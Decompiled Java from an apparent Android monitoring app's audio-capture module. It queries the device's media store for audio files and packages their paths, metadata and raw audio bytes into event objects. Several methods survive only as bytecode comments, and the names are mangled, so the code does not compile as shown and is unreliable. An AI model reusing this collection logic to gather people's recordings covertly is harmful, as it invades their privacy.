package com.vvt.capture.audio.b;

import android.content.ContentResolver;
import android.net.Uri;
import com.vvt.capture.audio.c;
import com.vvt.events.FxAudioFileThumnailEvent;
import com.vvt.events.FxMediaType;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool1 = true;
    boolean bool2 = com.vvt.ak.a.a;
    if (bool2)
    {
      bool2 = bool1;
      a = bool2;
      bool2 = com.vvt.ak.a.e;
      if (!bool2) {
        break label34;
      }
    }
    for (;;)
    {
      b = bool1;
      return;
      bool2 = false;
      break;
      label34:
      bool1 = false;
    }
  }
  
  public static FxAudioFileThumnailEvent a(c paramc)
  {
    FxAudioFileThumnailEvent localFxAudioFileThumnailEvent = new com/vvt/events/FxAudioFileThumnailEvent;
    localFxAudioFileThumnailEvent.<init>();
    long l = paramc.b();
    localFxAudioFileThumnailEvent.setEventId(l);
    l = paramc.a();
    localFxAudioFileThumnailEvent.setEventTime(l);
    l = paramc.e();
    localFxAudioFileThumnailEvent.setActualFileSize(l);
    int i = paramc.f();
    localFxAudioFileThumnailEvent.setActualDuration(i);
    Object localObject = paramc.c();
    localFxAudioFileThumnailEvent.setFormat((FxMediaType)localObject);
    l = paramc.b();
    localFxAudioFileThumnailEvent.setParingId(l);
    localObject = paramc.d();
    localFxAudioFileThumnailEvent.setAudioData((byte[])localObject);
    localObject = paramc.g();
    localFxAudioFileThumnailEvent.setActualFullPath((String)localObject);
    return localFxAudioFileThumnailEvent;
  }
  
  /* Error */
  public static List a(ContentResolver paramContentResolver, Uri paramUri)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: aload_1
    //   3: ifnonnull +15 -> 18
    //   6: new 80	java/lang/NullPointerException
    //   9: astore_3
    //   10: aload_3
    //   11: ldc 82
    //   13: invokespecial 84	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   16: aload_3
    //   17: athrow
    //   18: aload_0
    //   19: ifnonnull +15 -> 34
    //   22: new 80	java/lang/NullPointerException
    //   25: astore_3
    //   26: aload_3
    //   27: ldc 86
    //   29: invokespecial 84	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   32: aload_3
    //   33: athrow
    //   34: new 88	java/util/ArrayList
    //   37: astore 4
    //   39: aload 4
    //   41: invokespecial 89	java/util/ArrayList:<init>	()V
    //   44: ldc 91
    //   46: astore_3
    //   47: iconst_2
    //   48: istore 5
    //   50: iload 5
    //   52: anewarray 94	java/lang/String
    //   55: astore 6
    //   57: iconst_0
    //   58: istore 5
    //   60: aconst_null
    //   61: astore_3
    //   62: ldc 96
    //   64: astore 7
    //   66: aload 6
    //   68: iconst_0
    //   69: aload 7
    //   71: aastore
    //   72: iconst_1
    //   73: istore 5
    //   75: ldc 98
    //   77: astore 7
    //   79: aload 6
    //   81: iload 5
    //   83: aload 7
    //   85: aastore
    //   86: iconst_0
    //   87: istore 8
    //   89: aconst_null
    //   90: astore 9
    //   92: iconst_0
    //   93: istore 10
    //   95: aconst_null
    //   96: astore 11
    //   98: iconst_0
    //   99: istore 12
    //   101: aload_0
    //   102: astore_3
    //   103: aload_1
    //   104: astore 7
    //   106: aload_0
    //   107: aload_1
    //   108: aload 6
    //   110: aconst_null
    //   111: aconst_null
    //   112: aconst_null
    //   113: invokevirtual 104	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   116: astore_3
    //   117: aload_3
    //   118: ifnull +206 -> 324
    //   121: aload_3
    //   122: invokeinterface 110 1 0
    //   127: istore 13
    //   129: iload 13
    //   131: ifeq +203 -> 334
    //   134: ldc 96
    //   136: astore 7
    //   138: aload_3
    //   139: aload 7
    //   141: invokeinterface 114 2 0
    //   146: istore 13
    //   148: aload_3
    //   149: iload 13
    //   151: invokeinterface 118 2 0
    //   156: lstore 14
    //   158: ldc 98
    //   160: astore 9
    //   162: aload_3
    //   163: aload 9
    //   165: invokeinterface 114 2 0
    //   170: istore 8
    //   172: aload_3
    //   173: iload 8
    //   175: invokeinterface 122 2 0
    //   180: astore 9
    //   182: aload 9
    //   184: invokestatic 128	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   187: astore 9
    //   189: getstatic 13	com/vvt/capture/audio/removeFromPath/a:a	Z
    //   192: istore 10
    //   194: iload 10
    //   196: ifeq +3 -> 199
    //   199: new 130	java/io/File
    //   202: astore 11
    //   204: aload 11
    //   206: aload 9
    //   208: invokespecial 131	java/io/File:<init>	(Ljava/lang/String;)V
    //   211: aload 11
    //   213: invokevirtual 134	java/io/File:exists	()Z
    //   216: istore 12
    //   218: iload 12
    //   220: ifeq +15 -> 235
    //   223: aload 11
    //   225: invokevirtual 137	java/io/File:canRead	()Z
    //   228: istore 10
    //   230: iload 10
    //   232: ifne +16 -> 248
    //   235: getstatic 13	com/vvt/capture/audio/removeFromPath/a:a	Z
    //   238: istore 13
    //   240: iload 13
    //   242: ifeq -121 -> 121
    //   245: goto -124 -> 121
    //   248: ldc -117
    //   250: astore 11
    //   252: aload 9
    //   254: aload 11
    //   256: invokevirtual 143	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   259: istore 8
    //   261: iload 8
    //   263: ifeq +16 -> 279
    //   266: getstatic 13	com/vvt/capture/audio/removeFromPath/a:a	Z
    //   269: istore 13
    //   271: iload 13
    //   273: ifeq -152 -> 121
    //   276: goto -155 -> 121
    //   279: lload 14
    //   281: invokestatic 149	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   284: astore 7
    //   286: aload 4
    //   288: aload 7
    //   290: invokeinterface 155 2 0
    //   295: pop
    //   296: goto -175 -> 121
    //   299: astore 7
    //   301: getstatic 18	com/vvt/capture/audio/removeFromPath/a:removeFromPath	Z
    //   304: istore 13
    //   306: iload 13
    //   308: ifeq +3 -> 311
    //   311: aload_3
    //   312: ifnull +9 -> 321
    //   315: aload_3
    //   316: invokeinterface 158 1 0
    //   321: aload 4
    //   323: areturn
    //   324: getstatic 18	com/vvt/capture/audio/removeFromPath/a:removeFromPath	Z
    //   327: istore 13
    //   329: iload 13
    //   331: ifeq +3 -> 334
    //   334: aload_3
    //   335: ifnull -14 -> 321
    //   338: goto -23 -> 315
    //   341: astore_3
    //   342: aload_2
    //   343: ifnull +9 -> 352
    //   346: aload_2
    //   347: invokeinterface 158 1 0
    //   352: aload_3
    //   353: athrow
    //   354: astore 7
    //   356: aload_3
    //   357: astore_2
    //   358: aload 7
    //   360: astore_3
    //   361: goto -19 -> 342
    //   364: astore_3
    //   365: iconst_0
    //   366: istore 5
    //   368: aconst_null
    //   369: astore_3
    //   370: goto -69 -> 301
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	373	0	paramContentResolver	ContentResolver
    //   0	373	1	paramUri	Uri
    //   1	357	2	localObject1	Object
    //   9	326	3	localObject2	Object
    //   341	16	3	localObject3	Object
    //   360	1	3	localObject4	Object
    //   364	1	3	localException1	Exception
    //   369	1	3	localObject5	Object
    //   37	285	4	localArrayList	ArrayList
    //   48	319	5	i	int
    //   55	54	6	arrayOfString	String[]
    //   64	225	7	localObject6	Object
    //   299	1	7	localException2	Exception
    //   354	5	7	localObject7	Object
    //   87	87	8	j	int
    //   259	3	8	bool1	boolean
    //   90	163	9	str	String
    //   93	138	10	bool2	boolean
    //   96	159	11	localObject8	Object
    //   99	120	12	bool3	boolean
    //   127	3	13	bool4	boolean
    //   146	4	13	k	int
    //   238	92	13	bool5	boolean
    //   156	124	14	l	long
    // Exception table:
    //   from	to	target	type
    //   121	127	299	java/lang/Exception
    //   139	146	299	java/lang/Exception
    //   149	156	299	java/lang/Exception
    //   163	170	299	java/lang/Exception
    //   173	180	299	java/lang/Exception
    //   182	187	299	java/lang/Exception
    //   189	192	299	java/lang/Exception
    //   199	202	299	java/lang/Exception
    //   206	211	299	java/lang/Exception
    //   211	216	299	java/lang/Exception
    //   223	228	299	java/lang/Exception
    //   235	238	299	java/lang/Exception
    //   254	259	299	java/lang/Exception
    //   266	269	299	java/lang/Exception
    //   279	284	299	java/lang/Exception
    //   288	296	299	java/lang/Exception
    //   324	327	299	java/lang/Exception
    //   50	55	341	finally
    //   69	72	341	finally
    //   83	86	341	finally
    //   112	116	341	finally
    //   121	127	354	finally
    //   139	146	354	finally
    //   149	156	354	finally
    //   163	170	354	finally
    //   173	180	354	finally
    //   182	187	354	finally
    //   189	192	354	finally
    //   199	202	354	finally
    //   206	211	354	finally
    //   211	216	354	finally
    //   223	228	354	finally
    //   235	238	354	finally
    //   254	259	354	finally
    //   266	269	354	finally
    //   279	284	354	finally
    //   288	296	354	finally
    //   301	304	354	finally
    //   324	327	354	finally
    //   50	55	364	java/lang/Exception
    //   69	72	364	java/lang/Exception
    //   83	86	364	java/lang/Exception
    //   112	116	364	java/lang/Exception
  }
  
  /* Error */
  public static List a(ContentResolver paramContentResolver, Uri paramUri, int paramInt)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aload_1
    //   3: ifnonnull +18 -> 21
    //   6: new 80	java/lang/NullPointerException
    //   9: astore 4
    //   11: aload 4
    //   13: ldc 82
    //   15: invokespecial 84	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   18: aload 4
    //   20: athrow
    //   21: aload_0
    //   22: ifnonnull +18 -> 40
    //   25: new 80	java/lang/NullPointerException
    //   28: astore 4
    //   30: aload 4
    //   32: ldc 86
    //   34: invokespecial 84	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   37: aload 4
    //   39: athrow
    //   40: new 88	java/util/ArrayList
    //   43: astore 5
    //   45: aload 5
    //   47: invokespecial 89	java/util/ArrayList:<init>	()V
    //   50: ldc 91
    //   52: astore 4
    //   54: iconst_m1
    //   55: istore 6
    //   57: iload_2
    //   58: iload 6
    //   60: if_icmpne +7 -> 67
    //   63: iconst_m1
    //   64: iconst_1
    //   65: iushr
    //   66: istore_2
    //   67: new 162	java/lang/StringBuilder
    //   70: astore 4
    //   72: aload 4
    //   74: invokespecial 163	java/lang/StringBuilder:<init>	()V
    //   77: ldc -91
    //   79: astore 7
    //   81: aload 4
    //   83: aload 7
    //   85: invokevirtual 169	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   88: astore 4
    //   90: aload 4
    //   92: iload_2
    //   93: invokevirtual 172	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   96: astore 4
    //   98: aload 4
    //   100: invokevirtual 175	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   103: astore 8
    //   105: iconst_2
    //   106: istore 6
    //   108: iload 6
    //   110: anewarray 94	java/lang/String
    //   113: astore 9
    //   115: iconst_0
    //   116: istore 6
    //   118: aconst_null
    //   119: astore 4
    //   121: ldc 96
    //   123: astore 7
    //   125: aload 9
    //   127: iconst_0
    //   128: aload 7
    //   130: aastore
    //   131: iconst_1
    //   132: istore 6
    //   134: ldc 98
    //   136: astore 7
    //   138: aload 9
    //   140: iload 6
    //   142: aload 7
    //   144: aastore
    //   145: iconst_0
    //   146: istore 10
    //   148: aconst_null
    //   149: astore 11
    //   151: iconst_0
    //   152: istore 12
    //   154: aconst_null
    //   155: astore 13
    //   157: aload_0
    //   158: astore 4
    //   160: aload_1
    //   161: astore 7
    //   163: aload_0
    //   164: aload_1
    //   165: aload 9
    //   167: aconst_null
    //   168: aconst_null
    //   169: aload 8
    //   171: invokevirtual 104	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   174: astore 4
    //   176: aload 4
    //   178: ifnull +213 -> 391
    //   181: aload 4
    //   183: invokeinterface 110 1 0
    //   188: istore 14
    //   190: iload 14
    //   192: ifeq +209 -> 401
    //   195: ldc 96
    //   197: astore 7
    //   199: aload 4
    //   201: aload 7
    //   203: invokeinterface 114 2 0
    //   208: istore 14
    //   210: aload 4
    //   212: iload 14
    //   214: invokeinterface 118 2 0
    //   219: lstore 15
    //   221: ldc 98
    //   223: astore 11
    //   225: aload 4
    //   227: aload 11
    //   229: invokeinterface 114 2 0
    //   234: istore 10
    //   236: aload 4
    //   238: iload 10
    //   240: invokeinterface 122 2 0
    //   245: astore 11
    //   247: aload 11
    //   249: invokestatic 128	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   252: astore 11
    //   254: getstatic 13	com/vvt/capture/audio/removeFromPath/a:a	Z
    //   257: istore 12
    //   259: iload 12
    //   261: ifeq +3 -> 264
    //   264: new 130	java/io/File
    //   267: astore 13
    //   269: aload 13
    //   271: aload 11
    //   273: invokespecial 131	java/io/File:<init>	(Ljava/lang/String;)V
    //   276: aload 13
    //   278: invokevirtual 134	java/io/File:exists	()Z
    //   281: istore 17
    //   283: iload 17
    //   285: ifeq +15 -> 300
    //   288: aload 13
    //   290: invokevirtual 137	java/io/File:canRead	()Z
    //   293: istore 12
    //   295: iload 12
    //   297: ifne +16 -> 313
    //   300: getstatic 13	com/vvt/capture/audio/removeFromPath/a:a	Z
    //   303: istore 14
    //   305: iload 14
    //   307: ifeq -126 -> 181
    //   310: goto -129 -> 181
    //   313: ldc -117
    //   315: astore 13
    //   317: aload 11
    //   319: aload 13
    //   321: invokevirtual 143	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   324: istore 10
    //   326: iload 10
    //   328: ifeq +16 -> 344
    //   331: getstatic 13	com/vvt/capture/audio/removeFromPath/a:a	Z
    //   334: istore 14
    //   336: iload 14
    //   338: ifeq -157 -> 181
    //   341: goto -160 -> 181
    //   344: lload 15
    //   346: invokestatic 149	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   349: astore 7
    //   351: aload 5
    //   353: aload 7
    //   355: invokeinterface 155 2 0
    //   360: pop
    //   361: goto -180 -> 181
    //   364: astore 7
    //   366: getstatic 18	com/vvt/capture/audio/removeFromPath/a:removeFromPath	Z
    //   369: istore 14
    //   371: iload 14
    //   373: ifeq +3 -> 376
    //   376: aload 4
    //   378: ifnull +10 -> 388
    //   381: aload 4
    //   383: invokeinterface 158 1 0
    //   388: aload 5
    //   390: areturn
    //   391: getstatic 18	com/vvt/capture/audio/removeFromPath/a:removeFromPath	Z
    //   394: istore 14
    //   396: iload 14
    //   398: ifeq +3 -> 401
    //   401: aload 4
    //   403: ifnull -15 -> 388
    //   406: goto -25 -> 381
    //   409: astore 4
    //   411: aload_3
    //   412: ifnull +9 -> 421
    //   415: aload_3
    //   416: invokeinterface 158 1 0
    //   421: aload 4
    //   423: athrow
    //   424: astore 7
    //   426: aload 4
    //   428: astore_3
    //   429: aload 7
    //   431: astore 4
    //   433: goto -22 -> 411
    //   436: astore 4
    //   438: iconst_0
    //   439: istore 6
    //   441: aconst_null
    //   442: astore 4
    //   444: goto -78 -> 366
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	447	0	paramContentResolver	ContentResolver
    //   0	447	1	paramUri	Uri
    //   0	447	2	paramInt	int
    //   1	428	3	localObject1	Object
    //   9	393	4	localObject2	Object
    //   409	18	4	localObject3	Object
    //   431	1	4	localObject4	Object
    //   436	1	4	localException1	Exception
    //   442	1	4	localObject5	Object
    //   43	346	5	localArrayList	ArrayList
    //   55	385	6	i	int
    //   79	275	7	localObject6	Object
    //   364	1	7	localException2	Exception
    //   424	6	7	localObject7	Object
    //   103	67	8	str1	String
    //   113	53	9	arrayOfString	String[]
    //   146	93	10	j	int
    //   324	3	10	bool1	boolean
    //   149	169	11	str2	String
    //   152	144	12	bool2	boolean
    //   155	165	13	localObject8	Object
    //   188	3	14	bool3	boolean
    //   208	5	14	k	int
    //   303	94	14	bool4	boolean
    //   219	126	15	l	long
    //   281	3	17	bool5	boolean
    // Exception table:
    //   from	to	target	type
    //   181	188	364	java/lang/Exception
    //   201	208	364	java/lang/Exception
    //   212	219	364	java/lang/Exception
    //   227	234	364	java/lang/Exception
    //   238	245	364	java/lang/Exception
    //   247	252	364	java/lang/Exception
    //   254	257	364	java/lang/Exception
    //   264	267	364	java/lang/Exception
    //   271	276	364	java/lang/Exception
    //   276	281	364	java/lang/Exception
    //   288	293	364	java/lang/Exception
    //   300	303	364	java/lang/Exception
    //   319	324	364	java/lang/Exception
    //   331	334	364	java/lang/Exception
    //   344	349	364	java/lang/Exception
    //   353	361	364	java/lang/Exception
    //   391	394	364	java/lang/Exception
    //   67	70	409	finally
    //   72	77	409	finally
    //   83	88	409	finally
    //   92	96	409	finally
    //   98	103	409	finally
    //   108	113	409	finally
    //   128	131	409	finally
    //   142	145	409	finally
    //   169	174	409	finally
    //   181	188	424	finally
    //   201	208	424	finally
    //   212	219	424	finally
    //   227	234	424	finally
    //   238	245	424	finally
    //   247	252	424	finally
    //   254	257	424	finally
    //   264	267	424	finally
    //   271	276	424	finally
    //   276	281	424	finally
    //   288	293	424	finally
    //   300	303	424	finally
    //   319	324	424	finally
    //   331	334	424	finally
    //   344	349	424	finally
    //   353	361	424	finally
    //   366	369	424	finally
    //   391	394	424	finally
    //   67	70	436	java/lang/Exception
    //   72	77	436	java/lang/Exception
    //   83	88	436	java/lang/Exception
    //   92	96	436	java/lang/Exception
    //   98	103	436	java/lang/Exception
    //   108	113	436	java/lang/Exception
    //   128	131	436	java/lang/Exception
    //   142	145	436	java/lang/Exception
    //   169	174	436	java/lang/Exception
  }
  
  /* Error */
  private static List a(ContentResolver paramContentResolver, Uri paramUri, long paramLong)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 4
    //   3: aconst_null
    //   4: astore 5
    //   6: new 88	java/util/ArrayList
    //   9: astore 6
    //   11: aload 6
    //   13: invokespecial 89	java/util/ArrayList:<init>	()V
    //   16: aload_1
    //   17: ifnonnull +18 -> 35
    //   20: new 80	java/lang/NullPointerException
    //   23: astore 7
    //   25: aload 7
    //   27: ldc 82
    //   29: invokespecial 84	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   32: aload 7
    //   34: athrow
    //   35: aload_0
    //   36: ifnonnull +18 -> 54
    //   39: new 80	java/lang/NullPointerException
    //   42: astore 7
    //   44: aload 7
    //   46: ldc 86
    //   48: invokespecial 84	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   51: aload 7
    //   53: athrow
    //   54: iconst_2
    //   55: istore 8
    //   57: iload 8
    //   59: anewarray 4	java/lang/Object
    //   62: astore 9
    //   64: aload 9
    //   66: iconst_0
    //   67: ldc 96
    //   69: aastore
    //   70: lload_2
    //   71: invokestatic 149	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   74: astore 10
    //   76: aload 9
    //   78: iconst_1
    //   79: aload 10
    //   81: aastore
    //   82: ldc -79
    //   84: aload 9
    //   86: invokestatic 181	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   89: astore 10
    //   91: iconst_0
    //   92: istore 11
    //   94: aconst_null
    //   95: astore 12
    //   97: aconst_null
    //   98: astore 13
    //   100: aload_0
    //   101: astore 7
    //   103: aload_1
    //   104: astore 9
    //   106: aload_0
    //   107: aload_1
    //   108: aconst_null
    //   109: aload 10
    //   111: aconst_null
    //   112: aconst_null
    //   113: invokevirtual 104	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   116: astore 7
    //   118: aload 7
    //   120: ifnull +363 -> 483
    //   123: ldc 91
    //   125: astore 9
    //   127: aload 7
    //   129: invokeinterface 110 1 0
    //   134: istore 8
    //   136: iload 8
    //   138: ifeq +355 -> 493
    //   141: ldc 96
    //   143: astore 9
    //   145: aload 7
    //   147: aload 9
    //   149: invokeinterface 184 2 0
    //   154: istore 8
    //   156: aload 7
    //   158: iload 8
    //   160: invokeinterface 188 2 0
    //   165: istore 8
    //   167: ldc 98
    //   169: astore 12
    //   171: aload 7
    //   173: aload 12
    //   175: invokeinterface 184 2 0
    //   180: istore 11
    //   182: aload 7
    //   184: iload 11
    //   186: invokeinterface 122 2 0
    //   191: astore 12
    //   193: ldc -66
    //   195: astore 10
    //   197: aload 7
    //   199: aload 10
    //   201: invokeinterface 184 2 0
    //   206: istore 14
    //   208: aload 7
    //   210: iload 14
    //   212: invokeinterface 122 2 0
    //   217: astore 10
    //   219: aload 10
    //   221: invokestatic 195	com/vvt/events/f:a	(Ljava/lang/String;)Lcom/vvt/events/FxMediaType;
    //   224: astore 10
    //   226: new 197	java/util/Date
    //   229: astore 13
    //   231: aload 13
    //   233: invokespecial 198	java/util/Date:<init>	()V
    //   236: aload 13
    //   238: invokevirtual 201	java/util/Date:getTime	()J
    //   241: lstore 15
    //   243: ldc -53
    //   245: astore 5
    //   247: aload 7
    //   249: aload 5
    //   251: invokeinterface 184 2 0
    //   256: istore 4
    //   258: aload 7
    //   260: iload 4
    //   262: invokeinterface 188 2 0
    //   267: istore 4
    //   269: ldc -51
    //   271: astore 17
    //   273: aload 7
    //   275: aload 17
    //   277: invokeinterface 184 2 0
    //   282: istore 18
    //   284: aload 7
    //   286: iload 18
    //   288: invokeinterface 188 2 0
    //   293: istore 18
    //   295: aload 12
    //   297: invokestatic 128	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   300: astore 12
    //   302: getstatic 13	com/vvt/capture/audio/removeFromPath/a:a	Z
    //   305: istore 19
    //   307: iload 19
    //   309: ifeq +3 -> 312
    //   312: new 130	java/io/File
    //   315: astore 20
    //   317: aload 20
    //   319: aload 12
    //   321: invokespecial 131	java/io/File:<init>	(Ljava/lang/String;)V
    //   324: aload 20
    //   326: invokevirtual 134	java/io/File:exists	()Z
    //   329: istore 21
    //   331: iload 21
    //   333: ifeq +15 -> 348
    //   336: aload 20
    //   338: invokevirtual 137	java/io/File:canRead	()Z
    //   341: istore 19
    //   343: iload 19
    //   345: ifne +16 -> 361
    //   348: getstatic 13	com/vvt/capture/audio/removeFromPath/a:a	Z
    //   351: istore 8
    //   353: iload 8
    //   355: ifeq -228 -> 127
    //   358: goto -231 -> 127
    //   361: new 26	com/vvt/capture/audio/MyUncaughtExceptionHandler
    //   364: astore 20
    //   366: aload 20
    //   368: invokespecial 206	com/vvt/capture/audio/MyUncaughtExceptionHandler:<init>	()V
    //   371: aload 20
    //   373: lload 15
    //   375: invokevirtual 208	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	(J)V
    //   378: aload 20
    //   380: aload 10
    //   382: invokevirtual 210	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	(Lcom/vvt/events/FxMediaType;)V
    //   385: iload 8
    //   387: i2l
    //   388: lstore 22
    //   390: aload 20
    //   392: lload 22
    //   394: invokevirtual 212	com/vvt/capture/audio/MyUncaughtExceptionHandler:removeFromPath	(J)V
    //   397: iload 18
    //   399: sipush 1000
    //   402: idiv
    //   403: istore 8
    //   405: aload 20
    //   407: iload 8
    //   409: invokevirtual 214	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	(I)V
    //   412: iconst_0
    //   413: istore 8
    //   415: aconst_null
    //   416: astore 9
    //   418: aload 20
    //   420: aconst_null
    //   421: invokevirtual 216	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	([B)V
    //   424: iload 4
    //   426: i2l
    //   427: lstore 22
    //   429: aload 20
    //   431: lload 22
    //   433: invokevirtual 218	com/vvt/capture/audio/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	(J)V
    //   436: aload 20
    //   438: aload 12
    //   440: invokevirtual 220	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
    //   443: aload 6
    //   445: aload 20
    //   447: invokeinterface 155 2 0
    //   452: pop
    //   453: goto -326 -> 127
    //   456: astore 9
    //   458: getstatic 18	com/vvt/capture/audio/removeFromPath/a:removeFromPath	Z
    //   461: istore 8
    //   463: iload 8
    //   465: ifeq +3 -> 468
    //   468: aload 7
    //   470: ifnull +10 -> 480
    //   473: aload 7
    //   475: invokeinterface 158 1 0
    //   480: aload 6
    //   482: areturn
    //   483: getstatic 18	com/vvt/capture/audio/removeFromPath/a:removeFromPath	Z
    //   486: istore 8
    //   488: iload 8
    //   490: ifeq +3 -> 493
    //   493: aload 7
    //   495: ifnull -15 -> 480
    //   498: goto -25 -> 473
    //   501: astore 7
    //   503: aload 5
    //   505: ifnull +10 -> 515
    //   508: aload 5
    //   510: invokeinterface 158 1 0
    //   515: aload 7
    //   517: athrow
    //   518: astore 9
    //   520: aload 7
    //   522: astore 5
    //   524: aload 9
    //   526: astore 7
    //   528: goto -25 -> 503
    //   531: astore 7
    //   533: aconst_null
    //   534: astore 7
    //   536: goto -78 -> 458
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	539	0	paramContentResolver	ContentResolver
    //   0	539	1	paramUri	Uri
    //   0	539	2	paramLong	long
    //   1	424	4	i	int
    //   4	519	5	localObject1	Object
    //   9	472	6	localArrayList	ArrayList
    //   23	471	7	localObject2	Object
    //   501	20	7	localObject3	Object
    //   526	1	7	localObject4	Object
    //   531	1	7	localException1	Exception
    //   534	1	7	localObject5	Object
    //   55	3	8	j	int
    //   134	3	8	bool1	boolean
    //   154	12	8	k	int
    //   351	35	8	bool2	boolean
    //   403	11	8	m	int
    //   461	28	8	bool3	boolean
    //   62	355	9	localObject6	Object
    //   456	1	9	localException2	Exception
    //   518	7	9	localObject7	Object
    //   74	307	10	localObject8	Object
    //   92	93	11	n	int
    //   95	344	12	str1	String
    //   98	139	13	localDate	java.util.Date
    //   206	5	14	i1	int
    //   241	133	15	l1	long
    //   271	5	17	str2	String
    //   282	121	18	i2	int
    //   305	39	19	bool4	boolean
    //   315	131	20	localObject9	Object
    //   329	3	21	bool5	boolean
    //   388	44	22	l2	long
    // Exception table:
    //   from	to	target	type
    //   127	134	456	java/lang/Exception
    //   147	154	456	java/lang/Exception
    //   158	165	456	java/lang/Exception
    //   173	180	456	java/lang/Exception
    //   184	191	456	java/lang/Exception
    //   199	206	456	java/lang/Exception
    //   210	217	456	java/lang/Exception
    //   219	224	456	java/lang/Exception
    //   226	229	456	java/lang/Exception
    //   231	236	456	java/lang/Exception
    //   236	241	456	java/lang/Exception
    //   249	256	456	java/lang/Exception
    //   260	267	456	java/lang/Exception
    //   275	282	456	java/lang/Exception
    //   286	293	456	java/lang/Exception
    //   295	300	456	java/lang/Exception
    //   302	305	456	java/lang/Exception
    //   312	315	456	java/lang/Exception
    //   319	324	456	java/lang/Exception
    //   324	329	456	java/lang/Exception
    //   336	341	456	java/lang/Exception
    //   348	351	456	java/lang/Exception
    //   361	364	456	java/lang/Exception
    //   366	371	456	java/lang/Exception
    //   373	378	456	java/lang/Exception
    //   380	385	456	java/lang/Exception
    //   392	397	456	java/lang/Exception
    //   399	403	456	java/lang/Exception
    //   407	412	456	java/lang/Exception
    //   420	424	456	java/lang/Exception
    //   431	436	456	java/lang/Exception
    //   438	443	456	java/lang/Exception
    //   445	453	456	java/lang/Exception
    //   483	486	456	java/lang/Exception
    //   112	116	501	finally
    //   127	134	518	finally
    //   147	154	518	finally
    //   158	165	518	finally
    //   173	180	518	finally
    //   184	191	518	finally
    //   199	206	518	finally
    //   210	217	518	finally
    //   219	224	518	finally
    //   226	229	518	finally
    //   231	236	518	finally
    //   236	241	518	finally
    //   249	256	518	finally
    //   260	267	518	finally
    //   275	282	518	finally
    //   286	293	518	finally
    //   295	300	518	finally
    //   302	305	518	finally
    //   312	315	518	finally
    //   319	324	518	finally
    //   324	329	518	finally
    //   336	341	518	finally
    //   348	351	518	finally
    //   361	364	518	finally
    //   366	371	518	finally
    //   373	378	518	finally
    //   380	385	518	finally
    //   392	397	518	finally
    //   399	403	518	finally
    //   407	412	518	finally
    //   420	424	518	finally
    //   431	436	518	finally
    //   438	443	518	finally
    //   445	453	518	finally
    //   458	461	518	finally
    //   483	486	518	finally
    //   112	116	531	java/lang/Exception
  }
  
  public static List a(ContentResolver paramContentResolver, Uri paramUri, List paramList1, List paramList2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if ((paramList1 == null) || (paramList2 == null)) {}
    for (Object localObject = localArrayList;; localObject = localArrayList)
    {
      return (List)localObject;
      Iterator localIterator = paramList2.iterator();
      for (;;)
      {
        boolean bool = localIterator.hasNext();
        if (!bool) {
          break;
        }
        long l = ((Long)localIterator.next()).longValue();
        localObject = Long.valueOf(l);
        bool = paramList1.contains(localObject);
        if (!bool)
        {
          localObject = a(paramContentResolver, paramUri, l);
          localArrayList.addAll((Collection)localObject);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/audio/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */